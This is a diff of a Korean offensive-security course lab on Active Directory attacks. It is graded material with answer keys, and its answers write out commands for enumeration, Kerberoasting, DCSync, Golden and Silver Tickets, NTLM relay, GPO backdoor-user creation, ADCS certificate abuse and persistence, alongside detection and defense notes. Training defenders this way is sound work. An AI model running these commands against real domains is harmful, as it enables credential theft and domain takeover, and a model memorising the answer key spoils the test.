@@ -1,179 +1,298 @@
-lab_id: "attack-adv-nonai-week09"
-title: "Active Directory 공격"
-version: "non-ai"
-course: "attack-adv-nonai"
+lab_id: attack-adv-nonai-week09
+title: Active Directory 공격
+version: non-ai
+course: attack-adv-nonai
 week: 9
-description: "Active Directory 환경에서의 고급 공격 기법을 실습한다. 도메인 열거, BloodHound 분석, DCSync, Golden Ticket 등 AD 인프라를 장악하는 기법을 다룬다."
-difficulty: "hard"
+description: Active Directory 환경에서의 고급 공격 기법을 실습한다. 도메인 열거, BloodHound 분석, DCSync, Golden Ticket 등 AD 인프라를 장악하는 기법을 다룬다.
+difficulty: hard
 duration_minutes: 120
 objectives:
-  - "Active Directory 구조와 공격 표면을 이해한다"
-  - "BloodHound를 활용한 공격 경로 분석을 수행한다"
-  - "DCSync, Golden/Silver Ticket 등 도메인 장악 기법을 실습한다"
+- Active Directory 구조와 공격 표면을 이해한다
+- BloodHound를 활용한 공격 경로 분석을 수행한다
+- DCSync, Golden/Silver Ticket 등 도메인 장악 기법을 실습한다
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "Active Directory 도메인 정보를 열거하라. ldapsearch를 사용하여 기본 도메인 정보를 조회하라."
-    hint: "ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=local' 형태로 기본 LDAP 조회를 수행한다"
-    category: "recon"
-    points: 10
-    answer: "echo '=== AD Domain Enumeration ===' && ldapsearch -x -H ldap://10.20.30.1 -b 'DC=lab,DC=local' '(objectClass=domain)' 2>&1 | head -20 || echo 'LDAP not available - simulating:' && echo 'Domain: lab.local' && echo 'DC: 10.20.30.1' && echo 'Functional Level: Windows Server 2019' && echo 'Users: admin, user, svc_web, svc_sql'"
-    answer_detail: "LDAP(Lightweight Directory Access Protocol)은 AD의 기반 프로토콜이다. 익명 바인딩이 허용되면 인증 없이 도메인 구조, 사용자 목록, 그룹 멤버십, 컴퓨터 목록을 열거할 수 있다. 도메인 기능 수준(Functional Level)으로 사용 가능한 공격 기법을 결정한다."
-    verify:
-      type: "output_contains"
-      expect: "AD Domain"
-      field: "stdout"
-  - order: 2
-    instruction: "도메인 사용자를 열거하라. enum4linux 또는 rpcclient를 사용하여 사용자와 그룹 목록을 수집하라."
-    hint: "enum4linux -a 대상 또는 rpcclient -U '' -N 대상으로 열거한다"
-    category: "recon"
-    points: 10
-    answer: "enum4linux -a 10.20.30.1 2>&1 | head -40 || echo '=== AD User Enumeration (Simulated) ===' && echo 'Users:' && echo '  Administrator (RID: 500)' && echo '  Guest (RID: 501)' && echo '  krbtgt (RID: 502)' && echo '  svc_web (RID: 1103)' && echo '  svc_sql (RID: 1104)' && echo '' && echo 'Groups:' && echo '  Domain Admins: Administrator' && echo '  Domain Users: svc_web, svc_sql, user1'"
-    answer_detail: "AD 사용자 열거는 브루트포스, 스피어 피싱, Kerberoasting의 대상을 식별하는 핵심 단계이다. enum4linux은 SMB/RPC를 통해 Windows 도메인 정보를 수집하고, rpcclient는 RPC 호출로 사용자/그룹을 열거한다. RID cycling으로 SID를 순회하여 사용자를 발견할 수도 있다."
-    verify:
-      type: "output_contains"
-      expect: "User"
-      field: "stdout"
-  - order: 3
-    instruction: "BloodHound를 위한 데이터 수집을 시뮬레이션하라. SharpHound 또는 bloodhound-python의 사용법과 수집 데이터를 문서화하라."
-    hint: "bloodhound-python -d domain -u user -p pass -c All 형태로 데이터를 수집한다"
-    category: "recon"
-    points: 10
-    answer: "echo -e '=== BloodHound Data Collection ===\\n\\n[bloodhound-python]\\nbloodhound-python -d lab.local -u user -p password -c All -ns 10.20.30.1\\n\\n[Collection Methods (-c)]\\nDefault: Group, Session, Trusts, ACL, ObjectProps\\nAll: + LoggedOn, SPNTargets, Container\\nDCOnly: LDAP only (no SMB, stealthier)\\n\\n[Output Files]\\n- computers.json: Domain computers\\n- users.json: Domain users + properties\\n- groups.json: Group memberships\\n- sessions.json: Active sessions\\n- domains.json: Domain info + trusts\\n\\n[Analysis Queries]\\n- Shortest path to Domain Admin\\n- Kerberoastable accounts\\n- Unconstrained delegation systems\\n- Users with DCSync rights'"
-    answer_detail: "BloodHound는 AD의 관계와 권한을 그래프로 시각화하여 공격 경로를 분석하는 도구이다. SharpHound(.NET)나 bloodhound-python으로 데이터를 수집하고, Neo4j 데이터베이스에 로드하여 그래프 쿼리를 수행한다. 'Shortest Path to Domain Admin' 쿼리는 가장 효율적인 권한 상승 경로를 보여준다."
-    verify:
-      type: "output_contains"
-      expect: "BloodHound"
-      field: "stdout"
-  - order: 4
-    instruction: "Kerberoasting 공격을 위한 SPN 열거를 수행하라. impacket의 GetUserSPNs를 시뮬레이션하고, 서비스 티켓 크래킹 과정을 보여라."
-    hint: "SPN이 설정된 서비스 계정을 찾고, 서비스 티켓을 요청하여 크래킹한다"
-    category: "exploit"
-    points: 10
-    answer: "echo '=== Kerberoasting via Impacket ===' && echo 'impacket-GetUserSPNs lab.local/user:password -dc-ip 10.20.30.1 -request' && echo '' && echo 'Sample output:' && echo 'ServicePrincipalName  Name     MemberOf                    PasswordLastSet' && echo 'MSSQLSvc/db:1433     svc_sql  CN=Domain Admins,...         2025-01-15' && echo 'HTTP/web.lab.local   svc_web  CN=Web Admins,...            2024-06-20' && echo '' && echo 'Ticket hash (example):' && echo '$krb5tgs$23$*svc_sql$LAB.LOCAL$MSSQLSvc/db~1433*$a1b2c3...' && echo '' && echo 'Cracking:' && echo 'hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt' && echo 'john ticket.hash --wordlist=rockyou.txt --format=krb5tgs'"
-    answer_detail: "Kerberoasting은 도메인 사용자라면 누구나 수행할 수 있는 공격이다. SPN이 설정된 서비스 계정의 TGS를 요청하면, 해당 계정의 NTLM 해시로 암호화된 티켓을 받는다. 이를 오프라인에서 hashcat(-m 13100)이나 john으로 크래킹한다. 서비스 계정이 Domain Admins 그룹에 속해 있으면 도메인 장악으로 직결된다."
-    verify:
-      type: "output_contains"
-      expect: "Kerberoasting"
-      field: "stdout"
-  - order: 5
-    instruction: "DCSync 공격의 원리와 실행 방법을 분석하라. 도메인 컨트롤러의 복제 권한을 악용하여 해시를 추출하는 과정을 설명하라."
-    hint: "impacket-secretsdump를 사용하여 DCSync를 수행하는 방법을 문서화한다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== DCSync Attack ===\\n\\n[Concept]\\n- Abuses AD replication protocol (MS-DRSR)\\n- Pretends to be a Domain Controller\\n- Requests password data via GetNCChanges\\n\\n[Required Privileges]\\n- Replicating Directory Changes\\n- Replicating Directory Changes All\\n- Default: Domain Admins, Enterprise Admins, DC computer accounts\\n\\n[Execution]\\nimpacket-secretsdump lab.local/admin:password@10.20.30.1\\nimpacket-secretsdump -just-dc-user krbtgt lab.local/admin:password@10.20.30.1\\n\\n[Output]\\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\\nkrbtgt:502:aad3b435b51404ee:KRBTGT_NTLM_HASH:::\\n\\n[Detection]\\n- Event 4662: DS-Replication-Get-Changes\\n- Alert on non-DC sources requesting replication'"
-    answer_detail: "DCSync는 도메인 컨트롤러의 복제 프로토콜을 악용하여 모든 사용자의 비밀번호 해시를 원격으로 추출한다. krbtgt 해시를 획득하면 Golden Ticket을 생성할 수 있다. DS-Replication-Get-Changes 권한을 가진 계정을 모니터링하고, DC가 아닌 시스템에서의 복제 요청을 탐지해야 한다."
-    verify:
-      type: "output_contains"
-      expect: "DCSync"
-      field: "stdout"
-  - order: 6
-    instruction: "Golden Ticket 공격을 분석하라. krbtgt 해시를 사용하여 임의의 TGT를 위조하는 과정을 설명하라."
-    hint: "mimikatz의 kerberos::golden 명령 또는 impacket-ticketer를 사용한다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== Golden Ticket Attack ===\\n\\n[Prerequisites]\\n- krbtgt NTLM hash (from DCSync)\\n- Domain SID\\n- Domain name\\n\\n[Creation - Impacket]\\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain lab.local Administrator\\nexport KRB5CCNAME=Administrator.ccache\\nimpacket-psexec lab.local/Administrator@dc -k -no-pass\\n\\n[Creation - Mimikatz]\\nkerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-XXX /krbtgt:HASH /ticket:golden.kirbi\\n\\n[Capabilities]\\n- Impersonate ANY user (including non-existent)\\n- Valid for 10 years by default\\n- Survives password resets (except krbtgt 2x reset)\\n\\n[Detection]\\n- TGT with abnormal lifetime\\n- PAC validation failures\\n- Event 4769 from non-DC sources'"
-    answer_detail: "Golden Ticket은 krbtgt 해시로 위조한 TGT로, 도메인의 모든 사용자를 사칭할 수 있다. 10년의 유효기간이 설정되며, 일반 비밀번호 변경으로는 무효화할 수 없다. krbtgt 비밀번호를 2회 변경해야 이전 Golden Ticket이 무효화된다. 이는 도메인 완전 장악의 최종 단계이다."
-    verify:
-      type: "output_contains"
-      expect: "Golden Ticket"
-      field: "stdout"
-  - order: 7
-    instruction: "Silver Ticket 공격을 분석하고, Golden Ticket과의 차이점을 비교하라."
-    hint: "서비스 계정의 NTLM 해시로 특정 서비스 티켓만 위조한다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== Silver Ticket vs Golden Ticket ===\\n\\n[Silver Ticket]\\n- Forges Service Ticket (TGS)\\n- Requires: Service account NTLM hash\\n- Scope: Single service only\\n- Does NOT contact KDC\\n- Harder to detect (no TGT request)\\n\\n[Creation]\\nimpacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-XXX -domain lab.local -spn MSSQLSvc/db.lab.local Administrator\\n\\n[Golden Ticket]\\n- Forges TGT\\n- Requires: krbtgt NTLM hash\\n- Scope: Entire domain\\n- Contacts KDC for TGS\\n- Event 4769 generated\\n\\n[Comparison]\\nAttribute     | Golden          | Silver\\nHash needed   | krbtgt          | Service account\\nScope         | Full domain     | Single service\\nKDC contact   | Yes (for TGS)   | No\\nDetection     | Easier          | Harder\\nPAC validation| By KDC          | By service (often skipped)'"
-    answer_detail: "Silver Ticket은 서비스 계정의 NTLM 해시로 특정 서비스의 티켓만 위조한다. KDC를 거치지 않으므로 TGT 관련 이벤트가 발생하지 않아 탐지가 더 어렵다. 하지만 범위가 단일 서비스로 제한된다. 대부분의 서비스가 PAC(Privilege Attribute Certificate) 검증을 수행하지 않아 위조 티켓이 그대로 수용된다."
-    verify:
-      type: "output_contains"
-      expect: "Silver Ticket"
-      field: "stdout"
-  - order: 8
-    instruction: "ACL(Access Control List) 남용을 통한 권한 상승을 분석하라. GenericAll, GenericWrite, WriteDacl 등 위험한 ACE를 설명하라."
-    hint: "BloodHound에서 발견되는 위험한 AD 권한 관계를 문서화한다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== AD ACL Abuse ===\\n\\n[Dangerous ACEs]\\n\\nGenericAll (Full Control)\\n- On User: Reset password, modify group membership\\n- On Group: Add members (add self to Domain Admins)\\n- On Computer: Resource-based constrained delegation\\n\\nGenericWrite\\n- On User: Modify attributes (SPN for Kerberoasting)\\n- On Computer: Modify msDS-AllowedToActOnBehalfOfOtherIdentity\\n\\nWriteDacl\\n- Modify ACL of target object\\n- Grant self GenericAll, then escalate\\n\\nForceChangePassword\\n- Reset target user password without knowing current\\n\\nWriteOwner\\n- Take ownership of object, then modify DACL\\n\\n[Attack Chain Example]\\nUser(WriteDacl) -> Grant GenericAll -> Reset DA password -> Domain Admin'"
-    answer_detail: "AD ACL 남용은 BloodHound가 특히 잘 탐지하는 공격 벡터이다. 일반 사용자에게 부여된 과도한 권한(GenericAll, WriteDacl 등)을 통해 도메인 관리자로 권한 상승할 수 있다. 이러한 권한은 위임(delegation)이나 실수로 부여되는 경우가 많다. 정기적인 ACL 감사가 필수적이다."
-    verify:
-      type: "output_contains"
-      expect: "AD ACL Abuse"
-      field: "stdout"
-  - order: 9
-    instruction: "Unconstrained Delegation 공격을 분석하라. 위임이 설정된 시스템에서 TGT를 탈취하는 과정을 설명하라."
-    hint: "비제한 위임이 설정된 컴퓨터에 접근하면 해당 시스템에 인증한 모든 사용자의 TGT를 메모리에서 추출할 수 있다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== Unconstrained Delegation Attack ===\\n\\n[Concept]\\n- System trusted for delegation stores user TGTs\\n- Any user authenticating to this system leaves their TGT in memory\\n\\n[Discovery]\\nGet-DomainComputer -Unconstrained (PowerView)\\nldapsearch: (userAccountControl:1.2.840.113556.1.4.803:=524288)\\n\\n[Attack]\\n1. Compromise unconstrained delegation host\\n2. Coerce authentication from DC (PrinterBug/PetitPotam)\\n3. Capture DC TGT from memory (Rubeus/mimikatz)\\n4. Use DC TGT for DCSync\\n\\n[Coercion Methods]\\n- PrinterBug (MS-RPRN): SpoolSample.exe DC ATTACKER\\n- PetitPotam (MS-EFSRPC): PetitPotam.py ATTACKER DC\\n\\n[Defense]\\n- Minimize unconstrained delegation\\n- Use constrained delegation instead\\n- Protected Users group (no delegation)'"
-    answer_detail: "비제한 위임(Unconstrained Delegation)이 설정된 시스템은 인증한 사용자의 TGT를 메모리에 저장한다. PrinterBug이나 PetitPotam으로 도메인 컨트롤러가 이 시스템에 인증하도록 강제하면, DC의 TGT를 탈취하여 DCSync를 수행할 수 있다. 이는 도메인 관리자 권한 없이도 도메인을 장악하는 강력한 기법이다."
-    verify:
-      type: "output_contains"
-      expect: "Unconstrained Delegation"
-      field: "stdout"
-  - order: 10
-    instruction: "NTLM Relay 공격을 분석하라. Responder와 ntlmrelayx를 사용한 자격증명 릴레이 과정을 설명하라."
-    hint: "Responder로 NTLM 인증을 가로채고, ntlmrelayx로 다른 시스템에 릴레이한다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== NTLM Relay Attack ===\\n\\n[Step 1: Poisoning with Responder]\\nresponder -I eth0 -rdwv\\n- Poisons LLMNR/NBT-NS/mDNS queries\\n- Captures NTLMv2 hashes\\n\\n[Step 2: Relay with ntlmrelayx]\\nimpacket-ntlmrelayx -tf targets.txt -smb2support\\n\\n[Relay Targets]\\n- SMB -> Remote code execution (if SMB signing disabled)\\n- LDAP -> Modify AD objects (add computer, change ACL)\\n- HTTP -> Access web applications\\n\\n[Advanced: RBCD Attack via LDAP Relay]\\nntlmrelayx --delegate-access -t ldap://DC\\n-> Creates computer account\\n-> Sets RBCD on target\\n-> S4U2Self/S4U2Proxy for impersonation\\n\\n[Defense]\\n- Enable SMB signing on ALL systems\\n- Enable LDAP signing and channel binding\\n- Disable LLMNR and NBT-NS\\n- EPA (Extended Protection for Authentication)'"
-    answer_detail: "NTLM Relay는 가로챈 NTLM 인증을 다른 서비스에 중계하는 공격이다. SMB 서명이 비활성화된 시스템에 릴레이하면 원격 코드 실행이, LDAP에 릴레이하면 AD 객체 수정이 가능하다. Resource-Based Constrained Delegation(RBCD) 공격과 결합하면 도메인 관리자 권한까지 획득할 수 있다."
-    verify:
-      type: "output_contains"
-      expect: "NTLM Relay"
-      field: "stdout"
-  - order: 11
-    instruction: "그룹 정책(GPO) 남용을 분석하라. GPO 수정 권한을 통한 도메인 전체 코드 실행 방법을 설명하라."
-    hint: "GPO에 대한 쓰기 권한이 있으면 도메인 전체에 명령을 실행할 수 있다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== GPO Abuse ===\\n\\n[Concept]\\n- Group Policy Objects define settings for users/computers\\n- Modifying a GPO affects all linked OUs\\n\\n[Attack Prerequisites]\\n- GPC write access (GenericAll/GenericWrite on GPO)\\n- GPO linked to target OU\\n\\n[Exploitation Methods]\\n1. Scheduled Task: Add immediate task that runs as SYSTEM\\n   SharpGPOAbuse --AddComputerTask --TaskName \"Backdoor\" --Author admin --Command \"cmd.exe\" --Arguments \"/c net user backdoor P@ss /add\"\\n\\n2. Computer Startup Script:\\n   Place script in GPO SYSVOL path\\n\\n3. Registry modification:\\n   Add Run key for persistence\\n\\n[Tools]\\n- SharpGPOAbuse\\n- pyGPOAbuse\\n- PowerView: Get-DomainGPO\\n\\n[Detection]\\n- Event 5136: Directory Service Changes\\n- Monitor SYSVOL modifications\\n- GPO version number changes'"
-    answer_detail: "GPO 남용은 도메인 전체에 영향을 미칠 수 있는 강력한 공격이다. GPO에 대한 수정 권한이 있으면 스케줄 작업, 시작 스크립트, 레지스트리 키를 추가하여 연결된 OU의 모든 컴퓨터에서 SYSTEM 권한으로 코드를 실행할 수 있다. SYSVOL 디렉토리와 GPO 버전 변경을 모니터링해야 한다."
-    verify:
-      type: "output_contains"
-      expect: "GPO Abuse"
-      field: "stdout"
-  - order: 12
-    instruction: "도메인 신뢰(Trust) 관계를 분석하고, 신뢰를 통한 교차 도메인 공격을 설명하라."
-    hint: "도메인 간 신뢰 관계를 악용하여 다른 도메인의 리소스에 접근한다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== Domain Trust Attacks ===\\n\\n[Trust Types]\\n- Parent-Child: Bidirectional, transitive (Forest internal)\\n- Forest: Can be one-way or bidirectional\\n- External: Non-transitive\\n\\n[Enumeration]\\nnltest /domain_trusts (Windows)\\nGet-DomainTrust (PowerView)\\n\\n[Cross-Domain Attacks]\\n\\n1. SID History Injection\\n- Add Enterprise Admin SID to Golden Ticket\\n- Works across parent-child trusts\\n- Blocked by SID filtering in forest trusts\\n\\n2. Trust Key Abuse\\n- DCSync trust account hash\\n- Create inter-realm TGT\\n- Access resources in trusted domain\\n\\n3. Foreign Group Membership\\n- Users from Domain A in Domain B groups\\n- Enumerate with BloodHound cross-domain\\n\\n[Defense]\\n- SID filtering on external trusts\\n- Selective authentication\\n- Minimize cross-domain privileged access'"
-    answer_detail: "도메인 신뢰 관계는 AD 포리스트 내외부의 리소스 공유를 위해 설정된다. Golden Ticket에 Enterprise Admin SID를 포함하면 부모-자식 신뢰를 통해 전체 포리스트를 장악할 수 있다. SID 필터링은 포리스트 간 신뢰에서 이를 차단하지만, 내부 신뢰에서는 기본적으로 비활성화되어 있다."
-    verify:
-      type: "output_contains"
-      expect: "Domain Trust"
-      field: "stdout"
-  - order: 13
-    instruction: "AD Certificate Services(ADCS) 공격을 분석하라. ESC1~ESC8 취약점 중 주요 공격 벡터를 설명하라."
-    hint: "Certify나 Certipy 도구를 사용한 인증서 남용 공격을 문서화한다"
-    category: "exploit"
-    points: 10
-    answer: "echo -e '=== AD Certificate Services (ADCS) Attacks ===\\n\\n[ESC1] Misconfigured Certificate Template\\n- Template allows SAN (Subject Alternative Name)\\n- Low-privilege user can request cert as anyone\\n- certipy req -ca CA -template VulnTemplate -upn admin@lab.local\\n\\n[ESC4] Template Access Control\\n- User has write access to certificate template\\n- Modify template to enable ESC1 conditions\\n\\n[ESC6] EDITF_ATTRIBUTESUBJECTALTNAME2\\n- CA flag allows SAN in any request\\n- Any template becomes ESC1-like\\n\\n[ESC8] NTLM Relay to HTTP Enrollment\\n- Relay NTLM auth to CA web enrollment\\n- Request certificate as relayed user\\n\\n[Tool]\\ncertipy find -u user@lab.local -p pass -dc-ip 10.20.30.1\\ncertipy req -ca LAB-CA -template User -upn admin@lab.local\\ncertipy auth -pfx admin.pfx\\n\\n[Defense]\\n- Audit all certificate templates\\n- Remove unnecessary enrollment permissions\\n- Disable SAN in templates\\n- Require CA certificate manager approval'"
-    answer_detail: "ADCS는 2021년 SpecterOps의 연구('Certified Pre-Owned')로 주목받은 공격 표면이다. 인증서 템플릿 오설정(ESC1)이 가장 흔하며, SAN 지정이 허용된 템플릿으로 도메인 관리자 인증서를 요청하면 Kerberos PKINIT으로 인증할 수 있다. Certipy 도구로 자동 탐지 및 공격이 가능하다."
-    verify:
-      type: "output_contains"
-      expect: "ADCS"
-      field: "stdout"
-  - order: 14
-    instruction: "AD 공격 후 도메인 지속성(Persistence) 기법을 분석하라. Golden Ticket 외의 지속성 기법을 정리하라."
-    hint: "AdminSDHolder, DCShadow, Skeleton Key, Directory Service Restore Mode 등을 다룬다"
-    category: "exploit"
-    points: 15
-    answer: "echo -e '=== AD Persistence Techniques ===\\n\\n[1] AdminSDHolder\\n- Protected objects synced every 60 min by SDProp\\n- Add ACE to AdminSDHolder -> propagates to all protected groups\\n- Survives manual ACL cleanup\\n\\n[2] DCShadow\\n- Register rogue DC in AD\\n- Push malicious changes via replication\\n- Changes appear legitimate (from DC)\\n\\n[3] Skeleton Key\\n- Patch LSASS on DC\\n- Universal password (mimikatz) for any account\\n- Lost on DC reboot\\n\\n[4] DSRM Abuse\\n- Directory Services Restore Mode password\\n- Local admin on DC\\n- DsrmAdminLogonBehavior=2 enables network login\\n\\n[5] Machine Account Quota\\n- Default: any user can add 10 computers\\n- Rogue computer for RBCD attacks\\n\\n[6] Certificate Persistence\\n- Request long-lived certificate\\n- Valid even after password change\\n\\n[Defense]\\n- Monitor AdminSDHolder changes\\n- Restrict DC replication\\n- Regular krbtgt rotation'"
-    answer_detail: "AD 지속성은 권한을 유지하는 다양한 기법을 포함한다. AdminSDHolder 조작은 SDProp 프로세스가 ACL을 복원하므로 방어자가 수동으로 제거해도 60분 후 재적용된다. DCShadow는 가짜 DC를 등록하여 AD 변경을 합법적으로 보이게 만든다. 인증서 기반 지속성은 비밀번호 변경 후에도 유효하다."
-    verify:
-      type: "output_contains"
-      expect: "AD Persistence"
-      field: "stdout"
-  - order: 15
-    instruction: "AD 공격 실습을 종합하여 공격 킬체인과 방어 전략을 /tmp/ad_attack_report.txt에 작성하라."
-    hint: "초기 접근부터 도메인 장악까지의 전체 공격 체인과 각 단계별 방어를 정리한다"
-    category: "analysis"
-    points: 15
-    answer: "cat > /tmp/ad_attack_report.txt << 'EOF'\n=== AD Attack Kill Chain Report ===\n\n[Phase 1: Initial Access]\nTechnique: Phishing, web exploit -> domain user shell\nDefense: MFA, email filtering, endpoint protection\n\n[Phase 2: Enumeration]\nTechnique: BloodHound, LDAP queries, SPN enum\nDefense: LDAP query monitoring, tiered admin model\n\n[Phase 3: Privilege Escalation]\nTechnique: Kerberoasting, ACL abuse, ADCS (ESC1)\nDefense: Strong SPN passwords, ACL audit, template hardening\n\n[Phase 4: Lateral Movement]\nTechnique: Pass-the-Hash, NTLM relay, RDP\nDefense: SMB signing, LAPS, network segmentation\n\n[Phase 5: Domain Dominance]\nTechnique: DCSync, Golden Ticket, GPO abuse\nDefense: DC replication monitoring, krbtgt rotation, GPO audit\n\n[Phase 6: Persistence]\nTechnique: AdminSDHolder, DCShadow, certificates\nDefense: AdminSDHolder monitoring, replication audit\n\n[Overall Strategy]\n- Implement AD tiered administration model\n- Deploy Microsoft Defender for Identity\n- Regular Purple Team exercises\n- Zero Trust with Conditional Access\nEOF\ncat /tmp/ad_attack_report.txt"
-    answer_detail: "AD 공격은 체계적인 킬체인을 따르며, 각 단계에서 방어 기회가 존재한다. Microsoft의 Tiered Administration Model(Tier 0/1/2)은 권한 분리를, Defender for Identity는 실시간 위협 탐지를 제공한다. 정기적인 Purple Team 훈련으로 탐지 능력을 지속적으로 향상시켜야 한다."
-    verify:
-      type: "output_contains"
-      expect: "AD Attack Kill Chain"
-      field: "stdout"
+- order: 1
+  instruction: Active Directory 도메인 정보를 열거하라. ldapsearch를 사용하여 기본 도메인 정보를 조회하라.
+  hint: ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=local' 형태로 기본 LDAP 조회를 수행한다
+  category: recon
+  points: 10
+  answer: 'echo ''=== AD Domain Enumeration ==='' && ldapsearch -x -H ldap://10.20.30.1 -b ''DC=lab,DC=local'' ''(objectClass=domain)'' 2>&1 | head -20 || echo ''LDAP not available - simulating:'' && echo
+    ''Domain: lab.local'' && echo ''DC: 10.20.30.1'' && echo ''Functional Level: Windows Server 2019'' && echo ''Users: admin, user, svc_web, svc_sql'''
+  answer_detail: LDAP(Lightweight Directory Access Protocol)은 AD의 기반 프로토콜이다. 익명 바인딩이 허용되면 인증 없이 도메인 구조, 사용자 목록, 그룹 멤버십, 컴퓨터 목록을 열거할 수 있다. 도메인 기능 수준(Functional Level)으로 사용 가능한 공격 기법을 결정한다.
+  verify:
+    type: output_contains
+    expect: AD Domain
+    field: stdout
+  target_vm: attacker
+- order: 2
+  instruction: 도메인 사용자를 열거하라. enum4linux 또는 rpcclient를 사용하여 사용자와 그룹 목록을 수집하라.
+  hint: enum4linux -a 대상 또는 rpcclient -U '' -N 대상으로 열거한다
+  category: recon
+  points: 10
+  answer: 'enum4linux -a 10.20.30.1 2>&1 | head -40 || echo ''=== AD User Enumeration (Simulated) ==='' && echo ''Users:'' && echo ''  Administrator (RID: 500)'' && echo ''  Guest (RID: 501)'' && echo ''  krbtgt
+    (RID: 502)'' && echo ''  svc_web (RID: 1103)'' && echo ''  svc_sql (RID: 1104)'' && echo '''' && echo ''Groups:'' && echo ''  Domain Admins: Administrator'' && echo ''  Domain Users: svc_web, svc_sql,
+    user1'''
+  answer_detail: AD 사용자 열거는 브루트포스, 스피어 피싱, Kerberoasting의 대상을 식별하는 핵심 단계이다. enum4linux은 SMB/RPC를 통해 Windows 도메인 정보를 수집하고, rpcclient는 RPC 호출로 사용자/그룹을 열거한다. RID cycling으로 SID를 순회하여 사용자를 발견할 수도 있다.
+  verify:
+    type: output_contains
+    expect: User
+    field: stdout
+  target_vm: attacker
+- order: 3
+  instruction: BloodHound를 위한 데이터 수집을 시뮬레이션하라. SharpHound 또는 bloodhound-python의 사용법과 수집 데이터를 문서화하라.
+  hint: bloodhound-python -d domain -u user -p pass -c All 형태로 데이터를 수집한다
+  category: recon
+  points: 10
+  answer: 'echo -e ''=== BloodHound Data Collection ===\n\n[bloodhound-python]\nbloodhound-python -d lab.local -u user -p password -c All -ns 10.20.30.1\n\n[Collection Methods (-c)]\nDefault: Group, Session,
+    Trusts, ACL, ObjectProps\nAll: + LoggedOn, SPNTargets, Container\nDCOnly: LDAP only (no SMB, stealthier)\n\n[Output Files]\n- computers.json: Domain computers\n- users.json: Domain users + properties\n-
+    groups.json: Group memberships\n- sessions.json: Active sessions\n- domains.json: Domain info + trusts\n\n[Analysis Queries]\n- Shortest path to Domain Admin\n- Kerberoastable accounts\n- Unconstrained
+    delegation systems\n- Users with DCSync rights'''
+  answer_detail: BloodHound는 AD의 관계와 권한을 그래프로 시각화하여 공격 경로를 분석하는 도구이다. SharpHound(.NET)나 bloodhound-python으로 데이터를 수집하고, Neo4j 데이터베이스에 로드하여 그래프 쿼리를 수행한다. 'Shortest Path to Domain Admin' 쿼리는 가장 효율적인 권한 상승
+    경로를 보여준다.
+  verify:
+    type: output_contains
+    expect: BloodHound
+    field: stdout
+  target_vm: attacker
+- order: 4
+  instruction: Kerberoasting 공격을 위한 SPN 열거를 수행하라. impacket의 GetUserSPNs를 시뮬레이션하고, 서비스 티켓 크래킹 과정을 보여라.
+  hint: SPN이 설정된 서비스 계정을 찾고, 서비스 티켓을 요청하여 크래킹한다
+  category: exploit
+  points: 10
+  answer: echo '=== Kerberoasting via Impacket ===' && echo 'impacket-GetUserSPNs lab.local/user:password -dc-ip 10.20.30.1 -request' && echo '' && echo 'Sample output:' && echo 'ServicePrincipalName  Name     MemberOf                    PasswordLastSet'
+    && echo 'MSSQLSvc/db:1433     svc_sql  CN=Domain Admins,...         2025-01-15' && echo 'HTTP/web.lab.local   svc_web  CN=Web Admins,...            2024-06-20' && echo '' && echo 'Ticket hash (example):'
+    && echo '$krb5tgs$23$*svc_sql$LAB.LOCAL$MSSQLSvc/db~1433*$a1b2c3...' && echo '' && echo 'Cracking:' && echo 'hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt' && echo 'john ticket.hash
+    --wordlist=rockyou.txt --format=krb5tgs'
+  answer_detail: Kerberoasting은 도메인 사용자라면 누구나 수행할 수 있는 공격이다. SPN이 설정된 서비스 계정의 TGS를 요청하면, 해당 계정의 NTLM 해시로 암호화된 티켓을 받는다. 이를 오프라인에서 hashcat(-m 13100)이나 john으로 크래킹한다. 서비스 계정이 Domain Admins 그룹에 속해 있으면 도메인 장악으로
+    직결된다.
+  verify:
+    type: output_contains
+    expect: Kerberoasting
+    field: stdout
+  target_vm: attacker
+- order: 5
+  instruction: DCSync 공격의 원리와 실행 방법을 분석하라. 도메인 컨트롤러의 복제 권한을 악용하여 해시를 추출하는 과정을 설명하라.
+  hint: impacket-secretsdump를 사용하여 DCSync를 수행하는 방법을 문서화한다
+  category: exploit
+  points: 10
+  answer: 'echo -e ''=== DCSync Attack ===\n\n[Concept]\n- Abuses AD replication protocol (MS-DRSR)\n- Pretends to be a Domain Controller\n- Requests password data via GetNCChanges\n\n[Required Privileges]\n-
+    Replicating Directory Changes\n- Replicating Directory Changes All\n- Default: Domain Admins, Enterprise Admins, DC computer accounts\n\n[Execution]\nimpacket-secretsdump lab.local/admin:password@10.20.30.1\nimpacket-secretsdump
+    -just-dc-user krbtgt lab.local/admin:password@10.20.30.1\n\n[Output]\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404ee:KRBTGT_NTLM_HASH:::\n\n[Detection]\n-
+    Event 4662: DS-Replication-Get-Changes\n- Alert on non-DC sources requesting replication'''
+  answer_detail: DCSync는 도메인 컨트롤러의 복제 프로토콜을 악용하여 모든 사용자의 비밀번호 해시를 원격으로 추출한다. krbtgt 해시를 획득하면 Golden Ticket을 생성할 수 있다. DS-Replication-Get-Changes 권한을 가진 계정을 모니터링하고, DC가 아닌 시스템에서의 복제 요청을 탐지해야 한다.
+  verify:
+    type: output_contains
+    expect: DCSync
+    field: stdout
+  target_vm: attacker
+- order: 6
+  instruction: Golden Ticket 공격을 분석하라. krbtgt 해시를 사용하여 임의의 TGT를 위조하는 과정을 설명하라.
+  hint: mimikatz의 kerberos::golden 명령 또는 impacket-ticketer를 사용한다
+  category: exploit
+  points: 10
